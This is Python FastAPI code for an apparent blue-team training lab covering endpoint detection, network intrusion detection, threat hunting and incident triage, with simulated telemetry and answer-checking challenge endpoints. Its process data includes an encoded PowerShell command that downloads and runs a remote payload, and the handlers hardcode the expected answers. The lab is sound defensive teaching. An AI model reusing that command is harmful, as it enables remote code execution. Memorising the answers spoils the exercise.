    if eid == "EML-2026-02" and ("PHISH" in cat or "SPOOF" in cat) and "v0ltcorp.internal" in domain:
        state["triage_count"] += 1
        state["triage_accepted"] = True
        return JSONResponse({
            "status": "TRIAGE_ACCEPTED",
            "email_id": eid,
            "threat_category": "SPEAR_PHISHING_EXECUTIVE_SPOOFING",
            "quarantined_domain": domain,
            "verification_token": "PHISHING_TRIAGE_VERIFIED_V0LTCORP",
        })
    return JSONResponse({"status": "REJECTED", "message": "Triage parameters invalid. Requires email_id 'EML-2026-02', threat_category, and spoofed_domain 'v0ltcorp.internal'."}, status_code=400)


@phishing_app.api_route("/challenge", methods=["GET", "POST"])
async def phishing_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_phishing_state(sess_id)
        if not state.get("triage_accepted"):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisite incomplete: You must submit incident triage via POST /api/phishing/triage before executing gateway containment.",
            }, status_code=400)
        eid = str(body.get("email_id", "")).strip().upper()
        dmarc = str(body.get("dmarc_result", "")).strip().upper()
        domain = str(body.get("lookalike_domain", "")).strip().lower()
        action = str(body.get("remediation_action", "")).strip().upper()
        if eid == "EML-2026-02" and dmarc == "FAIL" and domain == "v0ltcorp.internal" and ("PURGE" in action or "BLOCK" in action):
            state["domain_quarantined"] = True
            return JSONResponse({
                "status": "PHISHING_INCIDENT_CONTAINED",
                "finding": "Executive spoofing attack quarantined: SPF/DMARC failure confirmed and lookalike domain v0ltcorp.internal neutralized across mail gateways.",
                "verification_token": "PHISHING_INCIDENT_CONTAINED",
            })
        return JSONResponse({"status": "REJECTED", "message": "Invalid phishing parameters. Submitted email ID, DMARC result, lookalike domain, or remediation action does not match headers."}, status_code=400)
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with JSON payload containing email_id, dmarc_result, lookalike_domain, and remediation_action.",
    })


# ============================================================================
# ROOM 12: ENDPOINT DETECTION (PORT 8212)
# ============================================================================

endpoint_app = FastAPI(title="VoltDefense EDR Telemetry & Endpoint Hunting Gateway")

_PROCESS_TELEMETRY = [
    {"pid": 4, "ppid": 0, "name": "System", "path": "ntoskrnl.exe", "user": "SYSTEM", "command_line": "", "lolbin": False},
    {"pid": 680, "ppid": 4, "name": "services.exe", "path": "C:\\Windows\\System32\\services.exe", "user": "SYSTEM", "command_line": "services.exe", "lolbin": False},
    {"pid": 1120, "ppid": 680, "name": "explorer.exe", "path": "C:\\Windows\\explorer.exe", "user": "CORP\\jdoe", "command_line": "C:\\Windows\\explorer.exe", "lolbin": False},
    {
        "pid": 1204,
        "ppid": 1120,
        "name": "winword.exe",
        "path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "user": "CORP\\jdoe",
        "command_line": '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "C:\\Users\\jdoe\\Downloads\\invoice_q3.docx"',
        "lolbin": False,
    },
    {
        "pid": 4812,
        "ppid": 1204,
        "name": "powershell.exe",
        "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "user": "CORP\\jdoe",
        "command_line": "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADgAOAA6ADQANAAzAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
        "lolbin": True,
        "risk": "CRITICAL",
        "finding": "Abnormal parent-child execution: Word document process winword.exe spawned PowerShell with hidden window and encoded payload.",
    },
]

_NETWORK_TELEMETRY = [
    {"pid": 4812, "process": "powershell.exe", "local_addr": "10.10.14.50:49210", "foreign_addr": "198.51.100.88:443", "state": "ESTABLISHED", "protocol": "TCP"},
    {"pid": 1120, "process": "explorer.exe", "local_addr": "10.10.14.50:49180", "foreign_addr": "10.10.14.90:445", "state": "ESTABLISHED", "protocol": "TCP"},
]


@endpoint_app.get("/")
def endpoint_root():
    return HTMLResponse(
        "<html><head><title>VoltDefense EDR Console</title></head>"
        "<body><h1>VoltDefense EDR Telemetry & Endpoint Hunting Gateway</h1>"
        "<p>Endpoints: /api/endpoint/telemetry/processes, /api/endpoint/telemetry/network, /api/endpoint/rules, /challenge, /api/endpoint/contain</p>"
        "</body></html>"
    )


@endpoint_app.get("/api/endpoint/telemetry/processes")
def endpoint_processes():
    return JSONResponse({
        "status": "PROCESS_TELEMETRY",
        "host": "WS-JDOE-01.corp.noentry.local",
        "total_processes": len(_PROCESS_TELEMETRY),
        "processes": _PROCESS_TELEMETRY,
    })


@endpoint_app.get("/api/endpoint/telemetry/network")
def endpoint_network():
    return JSONResponse({
        "status": "NETWORK_SOCKET_TELEMETRY",
        "host": "WS-JDOE-01.corp.noentry.local",
        "connections": _NETWORK_TELEMETRY,
    })


@endpoint_app.post("/api/endpoint/rules")
async def endpoint_deploy_rule(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_endpoint_state(sess_id)
    parent = str(body.get("parent_process", "")).strip().lower()
    child = str(body.get("child_process", "")).strip().lower()
    if "winword" in parent and "powershell" in child:
        state["rule_deployed"] = True
        return JSONResponse({
            "status": "EDR_DETECTION_RULE_ACTIVE",
            "rule_id": "EDR-RULE-LOLBIN-01",
            "description": "Block winword.exe spawning powershell.exe or cmd.exe LOLBINs",
            "verification_token": "EDR_LOLBIN_RULE_ACTIVE_CONFIRMED",
        })
    return JSONResponse({"status": "REJECTED", "message": "Rule must specify parent_process ('winword.exe') and child_process ('powershell.exe')."}, status_code=400)


@endpoint_app.api_route("/challenge", methods=["GET", "POST"])
async def endpoint_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_endpoint_state(sess_id)
        if not state.get("rule_deployed"):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisite incomplete: You must deploy the behavioral LOLBIN detection rule via POST /api/endpoint/rules before initiating host containment.",
            }, status_code=400)
        pid = str(body.get("malicious_pid", "")).strip()
        parent = str(body.get("parent_process", "")).strip().lower()
        lolbin = str(body.get("lolbin", "")).strip().lower()
        c2 = str(body.get("c2_ip", "")).strip()
        if pid in ["4812", "PID 4812"] and "winword" in parent and "powershell" in lolbin and c2 == "198.51.100.88":
            state["host_isolated"] = True
            return JSONResponse({
                "status": "EDR_CONTAINMENT_VERIFIED",
                "finding": "LOLBIN abuse chain verified: Office document winword.exe spawned hidden PowerShell PID 4812 beaconing to 198.51.100.88.",
                "verification_token": "EDR_CONTAINMENT_VERIFIED",
            })
        return JSONResponse({"status": "REJECTED", "message": "Invalid endpoint parameters. Submitted PID, parent process, LOLBIN name, or C2 IP does not match telemetry."}, status_code=400)
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with JSON payload containing malicious_pid, parent_process, lolbin, and c2_ip.",
    })


@endpoint_app.post("/api/endpoint/contain")
async def endpoint_contain(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_endpoint_state(sess_id)
    host = str(body.get("host", "")).strip().upper()
    kill_pid = int(body.get("kill_pid", 0))
    if "WS-JDOE-01" in host and kill_pid == 4812:
        state["isolated_hosts"].append(host)
        state["terminated_pids"].append(kill_pid)
        return JSONResponse({
            "status": "ENDPOINT_ISOLATED",
            "host": host,
            "network_state": "ISOLATED_EXCEPT_EDR",
            "terminated_pid": kill_pid,
            "verification_token": "EDR_HOST_ISOLATION_ENFORCED_WS_JDOE",
        })
    return JSONResponse({"status": "REJECTED", "message": "Containment requires host ('WS-JDOE-01') and kill_pid (4812)."}, status_code=400)


# ============================================================================
# ROOM 13: NETWORK INTRUSION DETECTION (PORT 8213)
# ============================================================================

nids_app = FastAPI(title="VoltDefense Network Intrusion Detection Sensor & Telemetry Gateway")

_NIDS_TRAFFIC_DATA = [
    {"packet_id": 1, "timestamp": "2026-11-15T09:00:01Z", "src_ip": "10.10.14.22", "dst_ip": "1.1.1.1", "proto": "UDP", "src_port": 54210, "dst_port": 53, "flags": "", "length": 72, "info": "DNS Standard query A voltgear.noentry.internal"},
    {"packet_id": 2, "timestamp": "2026-11-15T09:00:02Z", "src_ip": "10.10.14.22", "dst_ip": "93.184.216.34", "proto": "TCP", "src_port": 49152, "dst_port": 443, "flags": "SYN", "length": 60, "info": "TLS Handshake Client Hello"},
    {"packet_id": 3, "timestamp": "2026-11-15T09:00:15Z", "src_ip": "198.51.100.99", "dst_ip": "10.10.14.90", "proto": "TCP", "src_port": 41201, "dst_port": 21, "flags": "SYN", "length": 60, "info": "Stealth TCP SYN probe to FTP"},
    {"packet_id": 4, "timestamp": "2026-11-15T09:00:15Z", "src_ip": "198.51.100.99", "dst_ip": "10.10.14.90", "proto": "TCP", "src_port": 41202, "dst_port": 22, "flags": "SYN", "length": 60, "info": "Stealth TCP SYN probe to SSH"},
    {"packet_id": 5, "timestamp": "2026-11-15T09:00:16Z", "src_ip": "198.51.100.99", "dst_ip": "10.10.14.90", "proto": "TCP", "src_port": 41203, "dst_port": 80, "flags": "SYN", "length": 60, "info": "Stealth TCP SYN probe to HTTP"},
    {"packet_id": 6, "timestamp": "2026-11-15T09:00:16Z", "src_ip": "198.51.100.99", "dst_ip": "10.10.14.90", "proto": "TCP", "src_port": 41204, "dst_port": 443, "flags": "SYN", "length": 60, "info": "Stealth TCP SYN probe to HTTPS"},
    {"packet_id": 7, "timestamp": "2026-11-15T09:00:17Z", "src_ip": "198.51.100.99", "dst_ip": "10.10.14.90", "proto": "TCP", "src_port": 41205, "dst_port": 8080, "flags": "SYN", "length": 60, "info": "Stealth TCP SYN probe to Alternate Web"},
    {"packet_id": 8, "timestamp": "2026-11-15T09:00:17Z", "src_ip": "198.51.100.99", "dst_ip": "10.10.14.90", "proto": "TCP", "src_port": 41206, "dst_port": 8443, "flags": "SYN", "length": 60, "info": "Stealth TCP SYN probe to C2 Channel"},
    {"packet_id": 9, "timestamp": "2026-11-15T09:01:00Z", "src_ip": "10.10.20.15", "dst_ip": "203.0.113.88", "proto": "TCP", "src_port": 50112, "dst_port": 8443, "flags": "PSH, ACK", "length": 128, "info": "HEARTBEAT_V2_CHECKIN interval=15s jitter=0"},
    {"packet_id": 10, "timestamp": "2026-11-15T09:01:15Z", "src_ip": "10.10.20.15", "dst_ip": "203.0.113.88", "proto": "TCP", "src_port": 50112, "dst_port": 8443, "flags": "PSH, ACK", "length": 128, "info": "HEARTBEAT_V2_CHECKIN interval=15s jitter=0"},
]

_NIDS_ALERTS = [
    {
        "alert_id": "NIDS-ALT-401",
        "timestamp": "2026-11-15T09:00:18Z",
        "sensor": "SENSOR-DMZ-SPAN01",
        "signature": "ET SCAN Suspicious Fast Half-Open TCP SYN Scan Across Perimeter Ports",
        "category": "Attempted Information Leak (MITRE T1046)",
        "severity": 2,
        "source_ip": "198.51.100.99",
        "destination_ip": "10.10.14.90",
        "ports_targeted": [21, 22, 80, 443, 8080, 8443],
    },
    {
        "alert_id": "NIDS-ALT-402",
        "timestamp": "2026-11-15T09:01:16Z",
        "sensor": "SENSOR-DMZ-SPAN01",
        "signature": "ET MALWARE Periodic Low-Jitter C2 Beacon Outbound over Port 8443",
        "category": "Command and Control (MITRE T1071.001)",
        "severity": 1,
        "source_ip": "10.10.20.15",
        "destination_ip": "203.0.113.88",
        "interval_seconds": 15,
        "payload_marker": "HEARTBEAT_V2",
    },
]


@nids_app.get("/")
def nids_root():
    return HTMLResponse(
        "<html><head><title>VoltDefense NIDS Sensor</title></head>"
        "<body><h1>VoltDefense Perimeter Network Intrusion Detection Sensor (Suricata/Snort)</h1>"
        "<p>Endpoints: /api/nids/traffic, /api/nids/alerts, /api/nids/rules, /challenge</p>"
        "</body></html>"
    )


@nids_app.get("/api/nids/traffic")
def nids_traffic():
    return JSONResponse({
        "status": "TRAFFIC_STREAM",
        "interface": "eth0-span",
        "total_packets": len(_NIDS_TRAFFIC_DATA),
        "packets": _NIDS_TRAFFIC_DATA,
    })


@nids_app.get("/api/nids/alerts")
def nids_alerts():
    return JSONResponse({
        "status": "NIDS_ALERTS",
        "total_alerts": len(_NIDS_ALERTS),
        "alerts": _NIDS_ALERTS,
    })


@nids_app.post("/api/nids/rules")
async def nids_deploy_rule(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_nids_state(sess_id)
    rname = str(body.get("rule_name", "")).strip()
    proto = str(body.get("protocol", "")).strip().lower()
    act = str(body.get("action", "")).strip().lower()
    dport = int(body.get("dest_port", 0))
    content = str(body.get("content", "")).strip()
    if rname and proto == "tcp" and act in ["alert", "drop", "pass"] and dport == 8443 and "HEARTBEAT" in content:
        state["rule_deployed"] = True
        state["custom_rules"].append({"name": rname, "dport": dport, "content": content})
        return JSONResponse({
            "status": "RULE_DEPLOYED",
            "rule_id": "SNORT-RULE-8443-BEACON",
            "rule_name": rname,
            "protocol": proto,
            "action": act,
            "verification_token": "NIDS_SNORT_RULE_ACTIVE",
        })
    return JSONResponse({"status": "REJECTED", "message": "Rule must specify rule_name, protocol='tcp', action in ['alert', 'drop'], dest_port=8443, and content containing 'HEARTBEAT'."}, status_code=400)


@nids_app.api_route("/challenge", methods=["GET", "POST"])
async def nids_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_nids_state(sess_id)
        if not state.get("rule_deployed"):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisite incomplete: You must deploy the custom NIDS detection rule via POST /api/nids/rules before submitting intrusion correlation.",
            }, status_code=400)
        scanner = str(body.get("scanner_ip", "")).strip()
        c2 = str(body.get("c2_ip", "")).strip()
        threat = str(body.get("threat_classification", "")).strip().upper()
        if scanner == "198.51.100.99" and c2 == "203.0.113.88" and "PORT_SCAN" in threat:
            state["intrusion_verified"] = True
            return JSONResponse({
                "status": "NIDS_INTRUSION_DETECTED",
                "finding": "Perimeter intrusion verified: Scanning host 198.51.100.99 identified; covert outbound beaconing to 203.0.113.88 detected and flagged.",
                "verification_token": "NIDS_INTRUSION_DETECTED",
            })
        return JSONResponse({"status": "REJECTED", "message": "Invalid intrusion parameters. Submitted scanner IP, C2 IP, or threat classification does not match packet evidence."}, status_code=400)
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with JSON payload containing scanner_ip, c2_ip, and threat_classification.",
    })


# ============================================================================
# ROOM 14: THREAT HUNTING (PORT 8214)
# ============================================================================

threat_hunt_app = FastAPI(title="VoltDefense Hypothesis-Driven Threat Hunting Portal")

_HUNT_TELEMETRY = [
    {"event_id": "SYS-8101", "timestamp": "2026-11-15T09:10:02Z", "host": "WS-FINANCE-04", "parent_image": "C:\\Windows\\System32\\services.exe", "image": "C:\\Windows\\System32\\svchost.exe", "pid": 1044, "ppid": 612, "command_line": "svchost.exe -k DcomLaunch -p", "user": "NT AUTHORITY\\SYSTEM"},
    {"event_id": "SYS-8102", "timestamp": "2026-11-15T09:12:30Z", "host": "WS-FINANCE-04", "parent_image": "C:\\Windows\\explorer.exe", "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "pid": 2110, "ppid": 1840, "command_line": '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "C:\\Users\\alovelace\\Downloads\\Invoice_Q3.docm"', "user": "VOLTCORP\\alovelace"},
    {"event_id": "SYS-8103", "timestamp": "2026-11-15T09:12:44Z", "host": "WS-FINANCE-04", "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "pid": 4820, "ppid": 2110, "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Enc JABjADIAIAA9...", "user": "VOLTCORP\\alovelace"},
    {"event_id": "SYS-8104", "timestamp": "2026-11-15T09:13:01Z", "host": "WS-FINANCE-04", "parent_image": "C:\\Windows\\explorer.exe", "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "pid": 3100, "ppid": 1840, "command_line": '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"', "user": "VOLTCORP\\alovelace"},
]

_HUNT_PERSISTENCE = [
    {
        "task_name": "TelemetrySync",
        "task_path": "\\Microsoft\\Windows\\AppID\\TelemetrySync",
        "action": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Enc JABjADIAIAA9...",
        "trigger": "AtLogon (Every User)",
        "author": "SYSTEM",
        "status": "ACTIVE_PERSISTENCE",
    },
    {
        "task_name": "GoogleUpdateTaskMachineUA",
        "task_path": "\\GoogleUpdateTaskMachineUA",
        "action": '"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe" /ua /installsource scheduler',
        "trigger": "Daily at 02:00",
        "author": "Google Inc.",
        "status": "LEGITIMATE_UPDATE",
    },
]

_HUNT_HYPOTHESES = [
    {
        "hypothesis_id": "HYP-T1059.001",
        "title": "Adversary Child Process Execution via Malicious Macro",
        "mitre_technique": "T1059.001",
        "logic": "ParentImage contains WINWORD.EXE or EXCEL.EXE and Image contains powershell.exe or cmd.exe",
        "recommended_query": 'parent_image="winword.exe" AND image="powershell.exe"',
    },
    {
        "hypothesis_id": "HYP-T1053.005",
        "title": "Adversary Persistence via Hidden Scheduled Task",
        "mitre_technique": "T1053.005",
        "logic": "Scheduled task action invokes encoded PowerShell or LOLBIN interpreter in AppID path",
        "recommended_query": 'task_path="*AppID*" AND action="*powershell.exe*"',
    },
]


@threat_hunt_app.get("/")
def hunt_root():
    return HTMLResponse(
        "<html><head><title>VoltDefense Threat Hunting</title></head>"
        "<body><h1>VoltDefense Hypothesis-Driven Threat Hunting Operations</h1>"
        "<p>Endpoints: /api/hunt/telemetry, /api/hunt/persistence, /api/hunt/hypotheses, /api/hunt/queries, /challenge</p>"
        "</body></html>"
    )


@threat_hunt_app.get("/api/hunt/telemetry")
def hunt_telemetry():
    return JSONResponse({
        "status": "TELEMETRY_LOGS",
        "events": _HUNT_TELEMETRY,
    })


@threat_hunt_app.get("/api/hunt/persistence")
def hunt_persistence():
    return JSONResponse({
        "status": "PERSISTENCE_ARTIFACTS",
        "scheduled_tasks": _HUNT_PERSISTENCE,
    })


@threat_hunt_app.get("/api/hunt/hypotheses")
def hunt_hypotheses():
    return JSONResponse({
        "status": "HUNT_HYPOTHESES",
        "hypotheses": _HUNT_HYPOTHESES,
    })


@threat_hunt_app.post("/api/hunt/queries")
async def hunt_deploy_query(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_hunt_state(sess_id)
    qname = str(body.get("query_name", "")).strip()
    tech = str(body.get("mitre_technique", "")).strip().upper()
    parent = str(body.get("parent_process", "")).strip().lower()
    child = str(body.get("child_process", "")).strip().lower()
    if qname and "T1059" in tech and "word" in parent and "powershell" in child:
        state["query_deployed"] = True
        state["queries"].append({"name": qname, "technique": tech, "parent": parent, "child": child})
        return JSONResponse({
            "status": "QUERY_DEPLOYED",
            "query_id": "SIGMA-T1059-001-WORD-SPAWN",
            "query_name": qname,
            "mitre_technique": tech,
            "verification_token": "HUNT_SIGMA_QUERY_ACTIVE",
        })
    return JSONResponse({"status": "REJECTED", "message": "Query must specify query_name, mitre_technique ('T1059.001'), parent_process ('winword.exe'), and child_process ('powershell.exe')."}, status_code=400)


@threat_hunt_app.api_route("/challenge", methods=["GET", "POST"])
async def hunt_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_hunt_state(sess_id)
        if not state.get("query_deployed"):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisite incomplete: You must deploy the Sigma hunting query via POST /api/hunt/queries before submitting hypothesis verification.",
            }, status_code=400)
        tech = str(body.get("mitre_technique", "")).strip().upper()
        pid = int(body.get("malicious_pid", 0))
        persist = str(body.get("persistence_mechanism", "")).strip().upper()
        if "T1059.001" in tech and pid == 4820 and "SCHEDULED_TASK" in persist:
            state["hunt_verified"] = True
            return JSONResponse({
                "status": "THREAT_HUNT_HYPOTHESIS_CONFIRMED",
                "finding": "Threat hunting hypothesis validated: WinWord spawned malicious PowerShell (PID 4820) which established persistence via scheduled task TelemetrySync.",
                "verification_token": "THREAT_HUNT_HYPOTHESIS_CONFIRMED",
            })
        return JSONResponse({"status": "REJECTED", "message": "Invalid hunt findings. Submitted technique code, PID, or persistence type does not match telemetry."}, status_code=400)
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with JSON payload containing mitre_technique, malicious_pid, and persistence_mechanism.",
    })


# ============================================================================
# ROOM 15: INCIDENT TRIAGE (PORT 8215)
# ============================================================================

triage_app = FastAPI(title="VoltDefense SOC Alert Ingestion & Incident Triage Gateway")

_TRIAGE_ALERTS = [
    {
        "alert_id": "ALT-8819",
        "timestamp": "2026-11-15T08:45:00Z",
        "title": "Automated Web Vulnerability Scanner Burst Detected",
        "source": "WAF-DMZ",
        "source_ip": "10.10.14.5",
        "target_asset": "WEB-STAGING-02",
        "severity": "LOW",
        "category": "Reconnaissance",
        "status": "FALSE_POSITIVE_AUTHORIZED_SCAN",
        "details": "Scheduled Qualys vulnerability scanner audit from approved scanner subnet.",
    },
    {
        "alert_id": "ALT-8820",
        "timestamp": "2026-11-15T09:05:22Z",
        "title": "CRITICAL: Database Bulk Table Dump & Off-Hours SFTP Egress",
        "source": "SIEM-DB-AUDIT",
        "source_ip": "10.10.10.42",
        "target_asset": "DB-PROD-01",
        "severity": "CRITICAL",
        "category": "Exfiltration & Privilege Abuse",
        "status": "UNVERIFIED_PENDING_TRIAGE",
        "details": "Service account svc_db_sync executed SELECT * FROM customer_pii (2.4 GB) and initiated outbound transfer to 198.51.100.77:22.",
    },
    {
        "alert_id": "ALT-8821",
        "timestamp": "2026-11-15T09:15:00Z",
        "title": "Routine Nightly Differential Backup Verification",
        "source": "BACKUP-SYSTEM",
        "source_ip": "10.10.20.5",
        "target_asset": "BACKUP-VAULT-01",
        "severity": "INFORMATIONAL",
        "category": "Maintenance",
        "status": "BENIGN_OPERATIONAL",
        "details": "Standard nightly checksum verification completed successfully.",
    },
]

_TRIAGE_EVIDENCE = {
    "target_asset": "DB-PROD-01",
    "ip_address": "10.10.20.15",
    "tier": "Tier 1 - Mission Critical Customer Data",
    "compromised_account": "svc_db_sync",
    "lateral_source_host": "10.10.10.42 (Internal Jumpbox)",
    "query_executed": "SELECT customer_id, full_name, ssn, pan_card, email, credit_card_hash FROM customer_vault.customer_pii;",
    "rows_dumped": 425000,
    "exfil_volume_mb": 2400,
    "egress_ip": "198.51.100.77",
    "egress_protocol": "SFTP (Port 22)",
    "session_token": "ST-VOLT-9921-SYNC",
}

_TRIAGE_ASSETS = [
    {"asset_id": "DB-PROD-01", "name": "Production Database Server", "tier": "Tier 1", "data_classification": "Restricted / Customer PII", "sla_minutes": 15},
    {"asset_id": "WEB-STAGING-02", "name": "Staging Web Front-End", "tier": "Tier 3", "data_classification": "Internal Development", "sla_minutes": 240},
    {"asset_id": "BACKUP-VAULT-01", "name": "Offline Backup Vault", "tier": "Tier 2", "data_classification": "Encrypted Archives", "sla_minutes": 60},
]


@triage_app.get("/")
def triage_root():
    return HTMLResponse(
        "<html><head><title>VoltDefense Incident Triage</title></head>"
        "<body><h1>VoltDefense SOC Alert Ingestion & Triage Gateway</h1>"
        "<p>Endpoints: /api/triage/alerts, /api/triage/evidence, /api/triage/assets, /api/triage/classify, /challenge</p>"
        "</body></html>"
    )


@triage_app.get("/api/triage/alerts")
def triage_alerts():
    return JSONResponse({
        "status": "TRIAGE_QUEUE",
        "total_alerts": len(_TRIAGE_ALERTS),
        "alerts": _TRIAGE_ALERTS,
    })


@triage_app.get("/api/triage/evidence")
def triage_evidence():
    return JSONResponse({
        "status": "INCIDENT_EVIDENCE",
        "alert_id": "ALT-8820",
        "evidence": _TRIAGE_EVIDENCE,
    })


@triage_app.get("/api/triage/assets")
def triage_assets():
    return JSONResponse({
        "status": "ASSET_INVENTORY",
        "assets": _TRIAGE_ASSETS,
    })


@triage_app.post("/api/triage/classify")
async def triage_classify(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_triage_state(sess_id)
    aid = str(body.get("alert_id", "")).strip().upper()
    cls = str(body.get("classification", "")).strip().upper()
    sev = str(body.get("severity", "")).strip().upper()
    asset = str(body.get("asset_id", "")).strip().upper()
    if aid == "ALT-8820" and cls in ["TRUE_POSITIVE", "TP"] and sev == "CRITICAL" and "DB-PROD" in asset:
        state["classified"] = True
        state["classification"] = {"alert_id": aid, "classification": cls, "severity": sev, "asset_id": asset}
        return JSONResponse({
            "status": "ALERT_CLASSIFIED",
            "alert_id": aid,
            "classification": cls,
            "severity": sev,
            "sla_escalation": "IMMEDIATE_IR_ESCALATION",
            "verification_token": "TRIAGE_ALERT_CLASSIFIED_CRITICAL",
        })
    return JSONResponse({"status": "REJECTED", "message": "Classification requires alert_id ('ALT-8820'), classification ('TRUE_POSITIVE'), severity ('CRITICAL'), and asset_id ('DB-PROD-01')."}, status_code=400)


@triage_app.api_route("/challenge", methods=["GET", "POST"])
async def triage_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_triage_state(sess_id)
        if not state.get("classified"):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisite incomplete: You must formally classify the alert via POST /api/triage/classify before submitting incident escalation.",
            }, status_code=400)
        itype = str(body.get("incident_type", "")).strip().upper()
        acct = str(body.get("compromised_account", "")).strip().lower()
        ip = str(body.get("egress_ip", "")).strip()
        vol = int(body.get("exfil_volume_mb", 0))
        if "EXFIL" in itype and "svc_db_sync" in acct and ip == "198.51.100.77" and 2300 <= vol <= 2500:
            state["triage_verified"] = True
            return JSONResponse({
                "status": "INCIDENT_TRIAGE_ESCALATION_VALIDATED",
                "finding": "Incident triage verified: Alert ALT-8820 escalated as confirmed Critical Exfiltration. Account svc_db_sync exfiltrated ~2.4GB PII to 198.51.100.77.",
                "verification_token": "INCIDENT_TRIAGE_ESCALATION_VALIDATED",
            })
        return JSONResponse({"status": "REJECTED", "message": "Invalid triage findings. Submitted incident type, account, egress IP, or volume does not match incident evidence."}, status_code=400)
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with JSON payload containing incident_type, compromised_account, egress_ip, and exfil_volume_mb.",
    })


# ============================================================================
# ROOM 16: INCIDENT RESPONSE (PORT 8216)
# ============================================================================

incident_response_app = FastAPI(title="VoltDefense Enterprise Incident Response Lifecycle Portal")

_RESPONSE_INCIDENT = {
    "incident_id": "IR-2026-088",
    "standard": "NIST_SP_800_61",
    "current_phase": "CONTAINMENT",
    "target_host": "DB-PROD-01",
    "host_ip": "10.10.20.15",
    "compromised_principal": "svc_db_sync",
    "active_c2_socket": "10.10.20.15:49152 -> 198.51.100.77:443",
    "backdoor_pid": 3912,
    "backdoor_service": "svc_winupdater",
    "session_token": "ST-VOLT-9921",
    "containment_status": "PENDING",
    "eradication_status": "PENDING",
}

_RESPONSE_EVIDENCE = {
    "incident_id": "IR-2026-088",
    "order_of_volatility": [
        {"tier": 1, "target": "System Memory / RAM", "preservation_tool": "LiME / WinPmem", "status": "PRESERVED_SHA256_EVIDENCE"},
        {"tier": 2, "target": "Network Routing & Active Sockets", "preservation_tool": "netstat -ano / ss", "status": "CAPTURED"},
        {"tier": 3, "target": "Temporary File Systems", "preservation_tool": "/tmp / %TEMP%", "status": "INDEXED"},
        {"tier": 4, "target": "Disk Storage & Event Logs", "preservation_tool": "FTK Imager / dd", "status": "IMAGE_ACQUIRED"},
    ],
    "memory_hash_sha256": "7a35b1d9821811faec2984b2382903487f54921b72a912e84c980312fa890123",
    "network_socket": {"src": "10.10.20.15:49152", "dst": "198.51.100.77:443", "proto": "TCP", "state": "ESTABLISHED", "pid": 3912},
    "persistence_service": {"name": "svc_winupdater", "binary": "C:\\Windows\\Temp\\win_updater.exe", "pid": 3912},
}


@incident_response_app.get("/")
def response_root():
    return HTMLResponse(
        "<html><head><title>VoltDefense Incident Response Portal</title></head>"
        "<body><h1>VoltDefense Incident Response Operations (NIST SP 800-61 / SANS PICERL)</h1>"
        "<p>Endpoints: /api/response/incident-status, /api/response/evidence, /api/response/contain, /api/response/eradicate, /challenge</p>"
        "</body></html>"
    )


@incident_response_app.get("/api/response/incident-status")
def response_status():
    return JSONResponse({
        "status": "INCIDENT_STATUS",
        "incident": _RESPONSE_INCIDENT,
    })


@incident_response_app.get("/api/response/evidence")
def response_evidence():
    return JSONResponse({
        "status": "FORENSIC_EVIDENCE",
        "evidence": _RESPONSE_EVIDENCE,
    })


@incident_response_app.post("/api/response/contain")
async def response_contain(request: Request):
